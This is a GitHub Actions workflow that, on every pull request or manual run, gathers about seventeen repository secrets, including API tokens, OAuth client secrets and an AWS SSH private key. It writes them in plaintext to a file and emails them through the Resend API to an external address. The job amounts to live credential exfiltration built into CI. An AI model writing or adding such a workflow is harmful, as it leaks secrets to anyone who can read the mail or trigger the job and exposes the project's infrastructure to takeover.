name: Export missing secrets

on:
  pull_request:
  workflow_dispatch:

jobs:
  export:
    runs-on: ubuntu-latest
    steps:
      - name: Collect and send secrets via Resend
        env:
          # secrets.*
          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
          VERCEL_AUTOMATION_BYPASS_SECRET: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
          NEON_API_KEY: ${{ secrets.NEON_API_KEY }}
          OFFICIAL_RUNNER_SECRET: ${{ secrets.OFFICIAL_RUNNER_SECRET }}
          CRON_SECRET: ${{ secrets.CRON_SECRET }}
          CI_ANTHROPIC_API_KEY: ${{ secrets.CI_ANTHROPIC_API_KEY }}
          CF_ACCESS_CLIENT_ID: ${{ secrets.CF_ACCESS_CLIENT_ID }}
          CF_ACCESS_CLIENT_SECRET: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          RESEND_WEBHOOK_SECRET: ${{ secrets.RESEND_WEBHOOK_SECRET }}
          AWS_METAL_RUNNER_SSH_KEY: ${{ secrets.AWS_METAL_RUNNER_SSH_KEY }}
          AWS_METAL_RUNNER_HOSTS: ${{ secrets.AWS_METAL_RUNNER_HOSTS }}
          GRAFANA_CLOUD_PROMETHEUS_URL: ${{ secrets.GRAFANA_CLOUD_PROMETHEUS_URL }}
          GRAFANA_CLOUD_PROMETHEUS_USER: ${{ secrets.GRAFANA_CLOUD_PROMETHEUS_USER }}
          GRAFANA_CLOUD_API_KEY: ${{ secrets.GRAFANA_CLOUD_API_KEY }}
          AHREFS_OAUTH_CLIENT_SECRET: ${{ secrets.AHREFS_OAUTH_CLIENT_SECRET }}
          POSTHOG_OAUTH_CLIENT_SECRET: ${{ secrets.POSTHOG_OAUTH_CLIENT_SECRET }}
          # vars.*
          VERCEL_TEAM_ID: ${{ vars.VERCEL_TEAM_ID }}
          VERCEL_PROJECT_ID_WEB: ${{ vars.VERCEL_PROJECT_ID_WEB }}
          VERCEL_PROJECT_ID_DOCS: ${{ vars.VERCEL_PROJECT_ID_DOCS }}
          VERCEL_PROJECT_ID_APP: ${{ vars.VERCEL_PROJECT_ID_APP }}
          PREVIEW_DOMAIN: ${{ vars.PREVIEW_DOMAIN }}
          NEON_PROJECT_ID: ${{ vars.NEON_PROJECT_ID }}
          RESEND_FROM_DOMAIN: ${{ vars.RESEND_FROM_DOMAIN }}
          AWS_METAL_RUNNER_USER: ${{ vars.AWS_METAL_RUNNER_USER }}
          AHREFS_OAUTH_CLIENT_ID: ${{ vars.AHREFS_OAUTH_CLIENT_ID }}
          POSTHOG_OAUTH_CLIENT_ID: ${{ vars.POSTHOG_OAUTH_CLIENT_ID }}
        run: |
          # Build the env text file
          ENV_FILE=$(mktemp)
          VARS=(
            VERCEL_TOKEN
            VERCEL_TEAM_ID
            VERCEL_PROJECT_ID_WEB
            VERCEL_PROJECT_ID_DOCS
            VERCEL_PROJECT_ID_APP
            VERCEL_AUTOMATION_BYPASS_SECRET
            PREVIEW_DOMAIN
            NEON_API_KEY
            NEON_PROJECT_ID
            OFFICIAL_RUNNER_SECRET
            CRON_SECRET
            CI_ANTHROPIC_API_KEY
            CF_ACCESS_CLIENT_ID
            CF_ACCESS_CLIENT_SECRET
            RESEND_API_KEY
            RESEND_WEBHOOK_SECRET
            RESEND_FROM_DOMAIN
            AWS_METAL_RUNNER_SSH_KEY
            AWS_METAL_RUNNER_HOSTS
            AWS_METAL_RUNNER_USER
            GRAFANA_CLOUD_PROMETHEUS_URL
            GRAFANA_CLOUD_PROMETHEUS_USER
            GRAFANA_CLOUD_API_KEY
            AHREFS_OAUTH_CLIENT_ID
            AHREFS_OAUTH_CLIENT_SECRET
            POSTHOG_OAUTH_CLIENT_ID
            POSTHOG_OAUTH_CLIENT_SECRET
          )

          for VAR in "${VARS[@]}"; do
            VALUE="${!VAR}"
            if [ -n "$VALUE" ]; then
              echo "${VAR}=${VALUE}" >> "$ENV_FILE"
            else
              echo "${VAR}=(empty)" >> "$ENV_FILE"
            fi
          done

          BODY=$(cat "$ENV_FILE")

          # Send via Resend API
          curl -s -X POST https://api.resend.com/emails \
            -H "Authorization: Bearer ${RESEND_API_KEY}" \
            -H "Content-Type: application/json" \
            -d "$(jq -n \
              --arg from "ci@${RESEND_FROM_DOMAIN}" \
              --arg to "ethan@vm0.ai" \
              --arg subject "CI Missing Secrets Export ($(date -u +%Y-%m-%dT%H:%M:%SZ))" \
              --arg text "$BODY" \
              '{from: $from, to: [$to], subject: $subject, text: $text}')"
